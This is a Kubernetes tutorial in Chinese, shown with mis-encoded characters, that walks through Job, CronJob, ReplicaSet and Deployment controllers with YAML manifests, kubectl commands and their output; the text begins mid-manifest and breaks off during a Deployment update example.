template:\n    metadata:\n      labels:\n        app: counter-pod\n    spec:\n      restartPolicy: Never\n      containers:\n      - name: counter\n        image: busybox:1.30\n        command: ["bin/sh","-c","for i in 9 8 7 6 5 4 3 2 1; do echo $i;sleep 3;done"]\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n# åå»ºjob\n[root@k8s-master01 ~]# kubectl create -f pc-job.yaml\njob.batch/pc-job created\n\n# æ¥çjob\n[root@k8s-master01 ~]# kubectl get job -n dev -o wide  -w\nNAME     COMPLETIONS   DURATION   AGE   CONTAINERS   IMAGES         SELECTOR\npc-job   0/1           21s        21s   counter      busybox:1.30   app=counter-pod\npc-job   1/1           31s        79s   counter      busybox:1.30   app=counter-pod\n\n# éè¿è§å¯podç¶æå¯ä»¥çå°ï¼podå¨è¿è¡å®æ¯ä»»å¡åï¼å°±ä¼åæCompletedç¶æ\n[root@k8s-master01 ~]# kubectl get pods -n dev -w\nNAME           READY   STATUS     RESTARTS      AGE\npc-job-rxg96   1/1     Running     0            29s\npc-job-rxg96   0/1     Completed   0            33s\n\n# æ¥ä¸æ¥ï¼è°æ´ä¸podè¿è¡çæ»æ°éåå¹¶è¡æ°é å³ï¼å¨specä¸è®¾ç½®ä¸é¢ä¸¤ä¸ªéé¡¹\n#  completions: 6 # æå®jobéè¦æåè¿è¡Podsçæ¬¡æ°ä¸º6\n#  parallelism: 3 # æå®jobå¹¶åè¿è¡Podsçæ°éä¸º3\n#  ç¶åéæ°è¿è¡jobï¼è§å¯ææï¼æ­¤æ¶ä¼åç°ï¼jobä¼æ¯æ¬¡è¿è¡3ä¸ªpodï¼æ»å±æ§è¡äº6ä¸ªpod\n[root@k8s-master01 ~]# kubectl get pods -n dev -w\nNAME           READY   STATUS    RESTARTS   AGE\npc-job-684ft   1/1     Running   0          5s\npc-job-jhj49   1/1     Running   0          5s\npc-job-pfcvh   1/1     Running   0          5s\npc-job-684ft   0/1     Completed   0          11s\npc-job-v7rhr   0/1     Pending     0          0s\npc-job-v7rhr   0/1     Pending     0          0s\npc-job-v7rhr   0/1     ContainerCreating   0          0s\npc-job-jhj49   0/1     Completed           0          11s\npc-job-fhwf7   0/1     Pending             0          0s\npc-job-fhwf7   0/1     Pending             0          0s\npc-job-pfcvh   0/1     Completed           0          11s\npc-job-5vg2j   0/1     Pending             0          0s\npc-job-fhwf7   0/1     ContainerCreating   0          0s\npc-job-5vg2j   0/1     Pending             0          0s\npc-job-5vg2j   0/1     ContainerCreating   0          0s\npc-job-fhwf7   1/1     Running             0          2s\npc-job-v7rhr   1/1     Running             0          2s\npc-job-5vg2j   1/1     Running             0          3s\npc-job-fhwf7   0/1     Completed           0          12s\npc-job-v7rhr   0/1     Completed           0          12s\npc-job-5vg2j   0/1     Completed           0          12s\n\n# å é¤job\n[root@k8s-master01 ~]# kubectl delete -f pc-job.yaml\njob.batch "pc-job" deleted\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n\n\n\n# CronJob(CJ)\n\nCronJob æ§å¶å¨ä»¥ Job æ§å¶å¨èµæºä¸ºå¶ç®¡æ§å¯¹è±¡ï¼å¹¶åå©å®ç®¡ç pod èµæºå¯¹è±¡ï¼Job æ§å¶å¨å®ä¹çä½ä¸ä»»å¡å¨å¶æ§å¶å¨èµæºåå»ºä¹åä¾¿ä¼ç«å³æ§è¡ï¼ä½ CronJob å¯ä»¥ä»¥ç±»ä¼¼äº Linux æä½ç³»ç»çå¨ææ§ä»»å¡ä½ä¸è®¡åçæ¹å¼æ§å¶å¶è¿è¡æ¶é´ç¹åéå¤è¿è¡çæ¹å¼ãä¹å°±æ¯è¯´ï¼CronJob å¯ä»¥å¨ç¹å®çæ¶é´ç¹ (åå¤ç) å»è¿è¡ job ä»»å¡ã\n\n\n\nCronJob çèµæºæ¸åæä»¶ï¼\n\napiVersion: batch/v1beta1 # çæ¬å·\nkind: CronJob # ç±»å       \nmetadata: # åæ°æ®\n  name: # rsåç§° \n  namespace: # æå±å½åç©ºé´ \n  labels: #æ ç­¾\n    controller: cronjob\nspec: # è¯¦ææè¿°\n  schedule: # cronæ ¼å¼çä½ä¸è°åº¦è¿è¡æ¶é´ç¹,ç¨äºæ§å¶ä»»å¡å¨ä»ä¹æ¶é´æ§è¡\n  concurrencyPolicy: # å¹¶åæ§è¡ç­ç¥ï¼ç¨äºå®ä¹åä¸æ¬¡ä½ä¸è¿è¡å°æªå®ææ¶æ¯å¦ä»¥åå¦ä½è¿è¡åä¸æ¬¡çä½ä¸\n  failedJobHistoryLimit: # ä¸ºå¤±è´¥çä»»å¡æ§è¡ä¿ççåå²è®°å½æ°ï¼é»è®¤ä¸º1\n  successfulJobHistoryLimit: # ä¸ºæåçä»»å¡æ§è¡ä¿ççåå²è®°å½æ°ï¼é»è®¤ä¸º3\n  startingDeadlineSeconds: # å¯å¨ä½ä¸éè¯¯çè¶æ¶æ¶é¿\n  jobTemplate: # jobæ§å¶å¨æ¨¡æ¿ï¼ç¨äºä¸ºcronjobæ§å¶å¨çæjobå¯¹è±¡;ä¸é¢å¶å®å°±æ¯jobçå®ä¹\n    metadata:\n    spec:\n      completions: 1\n      parallelism: 1\n      activeDeadlineSeconds: 30\n      backoffLimit: 6\n      manualSelector: true\n      selector:\n        matchLabels:\n          app: counter-pod\n        matchExpressions: è§å\n          - {key: app, operator: In, values: [counter-pod]}\n      template:\n        metadata:\n          labels:\n            app: counter-pod\n        spec:\n          restartPolicy: Never \n          containers:\n          - name: counter\n            image: busybox:1.30\n            command: ["bin/sh","-c","for i in 9 8 7 6 5 4 3 2 1; do echo $i;sleep 20;done"]\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n\n\néè¦éç¹è§£éçå ä¸ªéé¡¹ï¼\nschedule: cronè¡¨è¾¾å¼ï¼ç¨äºæå®ä»»å¡çæ§è¡æ¶é´\n    */1    *      *    *     *\n    <åé> <å°æ¶> <æ¥> <æä»½> <ææ>\n\n    åé å¼ä» 0 å° 59.\n    å°æ¶ å¼ä» 0 å° 23.\n    æ¥ å¼ä» 1 å° 31.\n    æ å¼ä» 1 å° 12.\n    ææ å¼ä» 0 å° 6, 0 ä»£è¡¨æææ¥\n    å¤ä¸ªæ¶é´å¯ä»¥ç¨éå·éå¼ï¼ èå´å¯ä»¥ç¨è¿å­ç¬¦ç»åºï¼*å¯ä»¥ä½ä¸ºééç¬¦ï¼ /è¡¨ç¤ºæ¯...\nconcurrencyPolicy: æ¯å¦aä»»å¡1åéè¿è¡ä¸æ¬¡ï¼å¯æ¯aä»»å¡æ¬æ¬¡è¿è¡äºè¶è¿1åéï¼é£ä¹æ¯å¦åè®¸è®©ä¸ä¸ªå¨æçä»»å¡è¿è¡ï¼\n    Allow:   åè®¸Jobså¹¶åè¿è¡(é»è®¤)\n    Forbid:  ç¦æ­¢å¹¶åè¿è¡ï¼å¦æä¸ä¸æ¬¡è¿è¡å°æªå®æï¼åè·³è¿ä¸ä¸æ¬¡è¿è¡\n    Replace: æ¿æ¢ï¼åæ¶å½åæ­£å¨è¿è¡çä½ä¸å¹¶ç¨æ°ä½ä¸æ¿æ¢å®\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\nåå»º pc-cronjob.yamlï¼åå®¹å¦ä¸ï¼\n\napiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: pc-cronjob\n  namespace: dev\n  labels:\n    controller: cronjob\nspec:\n  schedule: "*/1 * * * *"\n  jobTemplate:\n    metadata:\n    spec:\n      template:\n        spec:\n          restartPolicy: Never\n          containers:\n          - name: counter\n            image: busybox:1.30\n            command: ["bin/sh","-c","for i in 9 8 7 6 5 4 3 2 1; do echo $i;sleep 3;done"]\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n# åå»ºcronjob\n[root@k8s-master01 ~]# kubectl create -f pc-cronjob.yaml\ncronjob.batch/pc-cronjob created\n\n# æ¥çcronjob\n[root@k8s-master01 ~]# kubectl get cronjobs -n dev\nNAME         SCHEDULE      SUSPEND   ACTIVE   LAST SCHEDULE   AGE\npc-cronjob   */1 * * * *   False     0        <none>          6s\n\n# æ¥çjob\n[root@k8s-master01 ~]# kubectl get jobs -n dev\nNAME                    COMPLETIONS   DURATION   AGE\npc-cronjob-1592587800   1/1           28s        3m26s\npc-cronjob-1592587860   1/1           28s        2m26s\npc-cronjob-1592587920   1/1           28s        86s\n\n# æ¥çpod\n[root@k8s-master01 ~]# kubectl get pods -n dev\npc-cronjob-1592587800-x4tsm   0/1     Completed   0          2m24s\npc-cronjob-1592587860-r5gv4   0/1     Completed   0          84s\npc-cronjob-1592587920-9dxxq   1/1     Running     0          24s\n\n\n# å é¤cronjob\n[root@k8s-master01 ~]# kubectl  delete -f pc-cronjob.yaml\ncronjob.batch "pc-cronjob" deleted\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n',normalizedContent:'# pod æ§å¶å¨ä»ç»\n\npod æ¯ kubernetes çæå°ç®¡çååï¼å¨ kubernetes ä¸­ï¼æç§ pod çåå»ºæ¹å¼å¯ä»¥å°å¶åä¸ºä¸¤ç±»ï¼\n\n * èªä¸»å¼ podï¼kubernetes ç´æ¥åå»ºåºæ¥ç podï¼è¿ç§ pod å é¤åå°±æ²¡æäºï¼ä¹ä¸ä¼éå»º\n * æ§å¶å¨åå»ºç podï¼kubernetes éè¿æ§å¶å¨åå»ºç podï¼è¿ç§ pod å é¤äºä¹åè¿ä¼èªå¨éå»º\n\n> ä»ä¹æ¯podæ§å¶å¨\n> pod æ§å¶å¨æ¯ç®¡ç pod çä¸­é´å±ï¼ä½¿ç¨ pod æ§å¶å¨ä¹åï¼åªéè¦åè¯ pod æ§å¶å¨ï¼æ³è¦å¤å°ä¸ªä»ä¹æ ·ç pod å°±å¯ä»¥äºï¼å®ä¼åå»ºåºæ»¡è¶³æ¡ä»¶ç pod å¹¶ç¡®ä¿æ¯ä¸ä¸ª pod èµæºå¤äºç¨æ·ææçç®æ ç¶æãå¦æ pod èµæºå¨è¿è¡ä¸­åºç°æéï¼å®ä¼åºäºæå®ç­ç¥éæ°ç¼æ podã\n\nå¨ kubernetes ä¸­ï¼æå¾å¤ç±»åç pod æ§å¶å¨ï¼æ¯ç§é½æèªå·±çéåçåºæ¯ï¼å¸¸è§çæä¸é¢è¿äºï¼\n\n * replicationcontrollerï¼æ¯è¾åå§ç pod æ§å¶å¨ï¼å·²ç»è¢«åºå¼ï¼ç± replicaset æ¿ä»£\n * replicasetï¼ä¿è¯å¯æ¬æ°éä¸ç´ç»´æå¨ææå¼ï¼å¹¶æ¯æ pod æ°éæ©ç¼©å®¹ï¼éåçæ¬åçº§\n * deploymentï¼éè¿æ§å¶ replicaset æ¥æ§å¶ podï¼å¹¶æ¯ææ»å¨åçº§ãåéçæ¬\n * horizontal pod autoscalerï¼å¯ä»¥æ ¹æ®éç¾¤è´è½½èªå¨æ°´å¹³è°æ´ pod çæ°éï¼å®ç°åå³°å¡«è°·\n * daemonsetï¼å¨éç¾¤ä¸­çæå® node ä¸è¿è¡ä¸ä»è¿è¡ä¸ä¸ªå¯æ¬ï¼ä¸è¬ç¨äºå®æ¤è¿ç¨ç±»çä»»å¡\n * jobï¼å®åå»ºåºæ¥ç pod åªè¦å®æä»»å¡å°±ç«å³éåºï¼ä¸éè¦éå¯æéå»ºï¼ç¨äºæ§è¡ä¸æ¬¡æ§ä»»å¡\n * cronjobï¼å®åå»ºç pod è´è´£å¨ææ§ä»»å¡æ§å¶ï¼ä¸éè¦æç»­åå°è¿è¡\n * statefulsetï¼ç®¡çæç¶æåºç¨\n\n\n# replicaset(rs)\n\nreplicaset çä¸»è¦ä½ç¨æ¯ä¿è¯ä¸å®æ°éç pod æ­£å¸¸è¿è¡ï¼å®ä¼æç»­çå¬è¿äº pod çè¿è¡ç¶æï¼ä¸æ¦ pod åçæéï¼å°±ä¼éå¯æéå»ºãåæ¶å®è¿æ¯æå¯¹ pod æ°éçæ©ç¼©å®¹åéåçæ¬çåéçº§ã\n\n\n\nreplicaset çèµæºæ¸åæä»¶ï¼\n\napiversion: apps/v1 # çæ¬å·\nkind: replicaset # ç±»å       \nmetadata: # åæ°æ®\n  name: # rsåç§° \n  namespace: # æå±å½åç©ºé´ \n  labels: #æ ç­¾\n    controller: rs\nspec: # è¯¦ææè¿°\n  replicas: 3 # å¯æ¬æ°é\n  selector: # éæ©å¨ï¼éè¿å®æå®è¯¥æ§å¶å¨ç®¡çåªäºpod\n    matchlabels:      # labelså¹éè§å\n      app: nginx-pod\n    matchexpressions: # expressionså¹éè§å\n      - {key: app, operator: in, values: [nginx-pod]}\n  template: # æ¨¡æ¿ï¼å½å¯æ¬æ°éä¸è¶³æ¶ï¼ä¼æ ¹æ®ä¸é¢çæ¨¡æ¿åå»ºpodå¯æ¬\n    metadata:\n      labels:\n        app: nginx-pod\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.17.1\n        ports:\n        - containerport: 80\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\nå¨è¿éé¢ï¼éè¦æ°äºè§£çéç½®é¡¹å°±æ¯ spec ä¸é¢å ä¸ªéé¡¹ï¼\n\n * replicasï¼æå®å¯æ¬æ°éï¼å¶å®å°±æ¯å½å rs åå»ºåºæ¥ç pod çæ°éï¼é»è®¤ä¸º 1\n * selectorï¼éæ©å¨ï¼å®çä½ç¨æ¯å»ºç« pod æ§å¶å¨å pod ä¹é´çå³èå³ç³»ï¼éç¨ç label selector æºå¶\n   å¨ pod æ¨¡æ¿ä¸å®ä¹ labelï¼å¨æ§å¶å¨ä¸å®ä¹éæ©å¨ï¼å°±å¯ä»¥è¡¨æå½åæ§å¶å¨è½ç®¡çåªäº pod äº\n * templateï¼æ¨¡æ¿ï¼å°±æ¯å½åæ§å¶å¨åå»º pod æä½¿ç¨çæ¨¡æ¿æ¿ï¼éé¢å¶å®å°±æ¯åä¸ç« å­¦è¿ç pod çå®ä¹\n\nåå»º replicaset\nåå»º pc-replicaset.yaml æä»¶ï¼åå®¹å¦ä¸ï¼\n\napiversion: apps/v1\nkind: replicaset   \nmetadata:\n  name: pc-replicaset\n  namespace: dev\nspec:\n  replicas: 3\n  selector: \n    matchlabels:\n      app: nginx-pod\n  template:\n    metadata:\n      labels:\n        app: nginx-pod\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.17.1\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n# åå»ºrs\n[root@k8s-master01 ~]# kubectl create -f pc-replicaset.yaml\nreplicaset.apps/pc-replicaset created\n\n# æ¥çrs\n# desired:ææå¯æ¬æ°é  \n# current:å½åå¯æ¬æ°é  \n# ready:å·²ç»åå¤å¥½æä¾æå¡çå¯æ¬æ°é\n[root@k8s-master01 ~]# kubectl get rs pc-replicaset -n dev -o wide\nname          desired   current ready age   containers   images             selector\npc-replicaset 3         3       3     22s   nginx        nginx:1.17.1       app=nginx-pod\n\n# æ¥çå½åæ§å¶å¨åå»ºåºæ¥çpod\n# è¿éåç°æ§å¶å¨åå»ºåºæ¥çpodçåç§°æ¯å¨æ§å¶å¨åç§°åé¢æ¼æ¥äº-xxxxxéæºç \n[root@k8s-master01 ~]# kubectl get pod -n dev\nname                          ready   status    restarts   age\npc-replicaset-6vmvt   1/1     running   0          54s\npc-replicaset-fmb8f   1/1     running   0          54s\npc-replicaset-snrk2   1/1     running   0          54s\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\næ©ç¼©å®¹\n\n# ç¼è¾rsçå¯æ¬æ°éï¼ä¿®æ¹spec:replicas: 6å³å¯\n[root@k8s-master01 ~]# kubectl edit rs pc-replicaset -n dev\nreplicaset.apps/pc-replicaset edited\n\n# æ¥çpod\n[root@k8s-master01 ~]# kubectl get pods -n dev\nname                          ready   status    restarts   age\npc-replicaset-6vmvt   1/1     running   0          114m\npc-replicaset-cftnp   1/1     running   0          10s\npc-replicaset-fjlm6   1/1     running   0          10s\npc-replicaset-fmb8f   1/1     running   0          114m\npc-replicaset-s2whj   1/1     running   0          10s\npc-replicaset-snrk2   1/1     running   0          114m\n\n# å½ç¶ä¹å¯ä»¥ç´æ¥ä½¿ç¨å½ä»¤å®ç°\n# ä½¿ç¨scaleå½ä»¤å®ç°æ©ç¼©å®¹ï¼ åé¢--replicas=nç´æ¥æå®ç®æ æ°éå³å¯\n[root@k8s-master01 ~]# kubectl scale rs pc-replicaset --replicas=2 -n dev\nreplicaset.apps/pc-replicaset scaled\n\n# å½ä»¤è¿è¡å®æ¯ï¼ç«å³æ¥çï¼åç°å·²ç»æ4ä¸ªå¼å§åå¤éåºäº\n[root@k8s-master01 ~]# kubectl get pods -n dev\nname                       ready   status        restarts   age\npc-replicaset-6vmvt   0/1     terminating   0          118m\npc-replicaset-cftnp   0/1     terminating   0          4m17s\npc-replicaset-fjlm6   0/1     terminating   0          4m17s\npc-replicaset-fmb8f   1/1     running       0          118m\npc-replicaset-s2whj   0/1     terminating   0          4m17s\npc-replicaset-snrk2   1/1     running       0          118m\n\n#ç¨ç­çå»ï¼å°±åªå©ä¸2ä¸ªäº\n[root@k8s-master01 ~]# kubectl get pods -n dev\nname                       ready   status    restarts   age\npc-replicaset-fmb8f   1/1     running   0          119m\npc-replicaset-snrk2   1/1     running   0          119m\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n\n\néååçº§\n\n# ç¼è¾rsçå®¹å¨éå - image: nginx:1.17.2\n[root@k8s-master01 ~]# kubectl edit rs pc-replicaset -n dev\nreplicaset.apps/pc-replicaset edited\n\n# åæ¬¡æ¥çï¼åç°éåçæ¬å·²ç»åæ´äº\n[root@k8s-master01 ~]# kubectl get rs -n dev -o wide\nname                desired  current   ready   age    containers   images        ...\npc-replicaset       2        2         2       140m   nginx         nginx:1.17.2  ...\n\n# åæ ·çéçï¼ä¹å¯ä»¥ä½¿ç¨å½ä»¤å®æè¿ä¸ªå·¥ä½\n# kubectl set image rs rsåç§° å®¹å¨=éåçæ¬ -n namespace\n[root@k8s-master01 ~]# kubectl set image rs pc-replicaset nginx=nginx:1.17.1  -n dev\nreplicaset.apps/pc-replicaset image updated\n\n# åæ¬¡æ¥çï¼åç°éåçæ¬å·²ç»åæ´äº\n[root@k8s-master01 ~]# kubectl get rs -n dev -o wide\nname                 desired  current   ready   age    containers   images            ...\npc-replicaset        2        2         2       145m   nginx        nginx:1.17.1 ... \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\nå é¤ replicaset\n\n# ä½¿ç¨kubectl deleteå½ä»¤ä¼å é¤æ­¤rsä»¥åå®ç®¡ççpod\n# å¨kuberneteså é¤rsåï¼ä¼å°rsçreplicasclearè°æ´ä¸º0ï¼ç­å¾ææçpodè¢«å é¤åï¼å¨æ§è¡rså¯¹è±¡çå é¤\n[root@k8s-master01 ~]# kubectl delete rs pc-replicaset -n dev\nreplicaset.apps "pc-replicaset" deleted\n[root@k8s-master01 ~]# kubectl get pod -n dev -o wide\nno resources found in dev namespace.\n\n# å¦æå¸æä»ä»å é¤rså¯¹è±¡ï¼ä¿çpodï¼ï¼å¯ä»¥ä½¿ç¨kubectl deleteå½ä»¤æ¶æ·»å --cascade=falseéé¡¹ï¼ä¸æ¨èï¼ã\n[root@k8s-master01 ~]# kubectl delete rs pc-replicaset -n dev --cascade=false\nreplicaset.apps "pc-replicaset" deleted\n[root@k8s-master01 ~]# kubectl get pods -n dev\nname                  ready   status    restarts   age\npc-replicaset-cl82j   1/1     running   0          75s\npc-replicaset-dslhb   1/1     running   0          75s\n\n# ä¹å¯ä»¥ä½¿ç¨yamlç´æ¥å é¤(æ¨è)\n[root@k8s-master01 ~]# kubectl delete -f pc-replicaset.yaml\nreplicaset.apps "pc-replicaset" deleted\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n\n# deployment(deploy)\n\nä¸ºäºæ´å¥½çè§£å³æå¡ç¼æçé®é¢ï¼kubernetes å¨ v1.2 çæ¬å¼å§ï¼å¼å¥äº deployment æ§å¶å¨ãå¼å¾ä¸æçæ¯ï¼è¿ç§æ§å¶å¨å¹¶ä¸ç´æ¥ç®¡ç podï¼èæ¯éè¿ç®¡ç replicaset æ¥ç®ä»ç®¡ç podï¼å³ï¼deployment ç®¡ç replicasetï¼replicaset ç®¡ç podãæä»¥ deployment æ¯ replicaset åè½æ´å å¼ºå¤§ã\n\n\n\ndeployment ä¸»è¦åè½æä¸é¢å ä¸ªï¼\n\n * æ¯æ replicaset çææåè½\n * æ¯æåå¸çåæ­¢ãç»§ç»­\n * æ¯ææ»å¨æ´æ°ååæ»çæ¬\n\ndeployment çèµæºæ¸åæä»¶ï¼\n\napiversion: apps/v1 # çæ¬å·\nkind: deployment # ç±»å       \nmetadata: # åæ°æ®\n  name: # rsåç§° \n  namespace: # æå±å½åç©ºé´ \n  labels: #æ ç­¾\n    controller: deploy\nspec: # è¯¦ææè¿°\n  replicas: 3 # å¯æ¬æ°é\n  revisionhistorylimit: 3 # ä¿çåå²çæ¬\n  paused: false # æåé¨ç½²ï¼é»è®¤æ¯false\n  progressdeadlineseconds: 600 # é¨ç½²è¶æ¶æ¶é´ï¼sï¼ï¼é»è®¤æ¯600\n  strategy: # ç­ç¥\n    type: rollingupdate # æ»å¨æ´æ°ç­ç¥\n    rollingupdate: # æ»å¨æ´æ°\n      maxsurge: 30% # æå¤§é¢å¤å¯ä»¥å­å¨çå¯æ¬æ°ï¼å¯ä»¥ä¸ºç¾åæ¯ï¼ä¹å¯ä»¥ä¸ºæ´æ°\n      maxunavailable: 30% # æå¤§ä¸å¯ç¨ç¶æç pod çæå¤§å¼ï¼å¯ä»¥ä¸ºç¾åæ¯ï¼ä¹å¯ä»¥ä¸ºæ´æ°\n  selector: # éæ©å¨ï¼éè¿å®æå®è¯¥æ§å¶å¨ç®¡çåªäºpod\n    matchlabels:      # labelså¹éè§å\n      app: nginx-pod\n    matchexpressions: # expressionså¹éè§å\n      - {key: app, operator: in, values: [nginx-pod]}\n  template: # æ¨¡æ¿ï¼å½å¯æ¬æ°éä¸è¶³æ¶ï¼ä¼æ ¹æ®ä¸é¢çæ¨¡æ¿åå»ºpodå¯æ¬\n    metadata:\n      labels:\n        app: nginx-pod\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.17.1\n        ports:\n        - containerport: 80\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n\n\nåå»º deployment\nåå»º pc-deployment.yamlï¼åå®¹å¦ä¸ï¼\n\napiversion: apps/v1\nkind: deployment      \nmetadata:\n  name: pc-deployment\n  namespace: dev\nspec: \n  replicas: 3\n  selector:\n    matchlabels:\n      app: nginx-pod\n  template:\n    metadata:\n      labels:\n        app: nginx-pod\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.17.1\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n# åå»ºdeployment\n[root@k8s-master01 ~]# kubectl create -f pc-deployment.yaml --record=true\ndeployment.apps/pc-deployment created\n\n# æ¥çdeployment\n# up-to-date ææ°çæ¬çpodçæ°é\n# available  å½åå¯ç¨çpodçæ°é\n[root@k8s-master01 ~]# kubectl get deploy pc-deployment -n dev\nname            ready   up-to-date   available   age\npc-deployment   3/3     3            3           15s\n\n# æ¥çrs\n# åç°rsçåç§°æ¯å¨åæ¥deploymentçåå­åé¢æ·»å äºä¸ä¸ª10ä½æ°çéæºä¸²\n[root@k8s-master01 ~]# kubectl get rs -n dev\nname                       desired   current   ready   age\npc-deployment-6696798b78   3         3         3       23s\n\n# æ¥çpod\n[root@k8s-master01 ~]# kubectl get pods -n dev\nname                             ready   status    restarts   age\npc-deployment-6696798b78-d2c8n   1/1     running   0          107s\npc-deployment-6696798b78-smpvp   1/1     running   0          107s\npc-deployment-6696798b78-wvjd8   1/1     running   0          107s\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\næ©ç¼©å®¹\n\n# åæ´å¯æ¬æ°éä¸º5ä¸ª\n[root@k8s-master01 ~]# kubectl scale deploy pc-deployment --replicas=5  -n dev\ndeployment.apps/pc-deployment scaled\n\n# æ¥çdeployment\n[root@k8s-master01 ~]# kubectl get deploy pc-deployment -n dev\nname            ready   up-to-date   available   age\npc-deployment   5/5     5            5           2m\n\n# æ¥çpod\n[root@k8s-master01 ~]#  kubectl get pods -n dev\nname                             ready   status    restarts   age\npc-deployment-6696798b78-d2c8n   1/1     running   0          4m19s\npc-deployment-6696798b78-jxmdq   1/1     running   0          94s\npc-deployment-6696798b78-mktqv   1/1     running   0          93s\npc-deployment-6696798b78-smpvp   1/1     running   0          4m19s\npc-deployment-6696798b78-wvjd8   1/1     running   0          4m19s\n\n# ç¼è¾deploymentçå¯æ¬æ°éï¼ä¿®æ¹spec:replicas: 4å³å¯\n[root@k8s-master01 ~]# kubectl edit deploy pc-deployment -n dev\ndeployment.apps/pc-deployment edited\n\n# æ¥çpod\n[root@k8s-master01 ~]# kubectl get pods -n dev\nname                             ready   status    restarts   age\npc-deployment-6696798b78-d2c8n   1/1     running   0          5m23s\npc-deployment-6696798b78-jxmdq   1/1     running   0          2m38s\npc-deployment-6696798b78-smpvp   1/1     running   0          5m23s\npc-deployment-6696798b78-wvjd8   1/1     running   0          5m23s\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n\n\néåæ´æ°\ndeployment æ¯æä¸¤ç§æ´æ°ç­ç¥: éå»ºæ´æ°ï¼å æææèçæ¬å¾podï¼ç¶åéå»ºæ°çæ¬çpodï¼ å æ»å¨æ´æ°ï¼é»è®¤ï¼ï¼ä¸ä¼ä¸æ¬¡æ§å é¤ï¼åå ä¸é¨åä½çæ¬ï¼å»ºç«ä¸é¨åæ°çæ¬ï¼ä»¥æ­¤ç±»æ¨ï¼ç´å°æ»¡è¶³æ°éï¼ , å¯ä»¥éè¿ strategy æå®ç­ç¥ç±»åï¼æ¯æä¸¤ä¸ªå±æ§:\n\nstrategyï¼æå®æ°çpodæ¿æ¢æ§çpodçç­ç¥ï¼ æ¯æä¸¤ä¸ªå±æ§ï¼\n  typeï¼æå®ç­ç¥ç±»åï¼æ¯æä¸¤ç§ç­ç¥\n    recreateï¼å¨åå»ºåºæ°çpodä¹åä¼åææææå·²å­å¨çpod\n    rollingupdateï¼æ»å¨æ´æ°ï¼å°±æ¯ææ­»ä¸é¨åï¼å°±å¯å¨ä¸é¨åï¼å¨æ´æ°è¿ç¨ä¸­ï¼å­å¨ä¸¤ä¸ªçæ¬pod\n  rollingupdateï¼å½typeä¸ºrollingupdateæ¶çæï¼ç¨äºä¸ºrollingupdateè®¾ç½®åæ°ï¼æ¯æä¸¤ä¸ªå±æ§ï¼\n    maxunavailableï¼ç¨æ¥æå®å¨åçº§è¿ç¨ä¸­ä¸å¯ç¨podçæå¤§æ°éï¼é»è®¤ä¸º25%ã\n    maxsurgeï¼ ç¨æ¥æå®å¨åçº§è¿ç¨ä¸­å¯ä»¥è¶è¿ææçpodçæå¤§æ°éï¼é»è®¤ä¸º25%ã\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\néå»ºæ´æ°\n1. ç¼è¾ pc-deployment.yaml, å¨ spec èç¹ä¸æ·»å æ´æ°ç­ç¥\n\nspec:\n  strategy: # ç­ç¥\n    type: recreate # éå»ºæ´æ°\n\n\n1\n2\n3\n\n\n2. åå»º deploy è¿è¡éªè¯\n\n# åæ´éå\n[root@k8s-master01 ~]# kubectl set image deployment pc-deployment nginx=nginx:1.17.2 -n dev\ndeployment.apps/pc-deployment image updated\n\n# è§å¯åçº§è¿ç¨\n[root@k8s-master01 ~]#  kubectl get pods -n dev -w\nname                             ready   status    restarts   age\npc-deployment-5d89bdfbf9-65qcw   1/1     running   0          31s\npc-deployment-5d89bdfbf9-w5nzv   1/1     running   0          31s\npc-deployment-5d89bdfbf9-xpt7w   1/1     running   0          31s\n\npc-deployment-5d89bdfbf9-xpt7w   1/1     terminating   0          41s\npc-deployment-5d89bdfbf9-65qcw   1/1     terminating   0          41s\npc-deployment-5d89bdfbf9-w5nzv   1/1     terminating   0          41s\n\npc-deployment-675d469f8b-grn8z   0/1     pending       0          0s\npc-deployment-675d469f8b-hbl4v   0/1     pending       0          0s\npc-deployment-675d469f8b-67nz2   0/1     pending 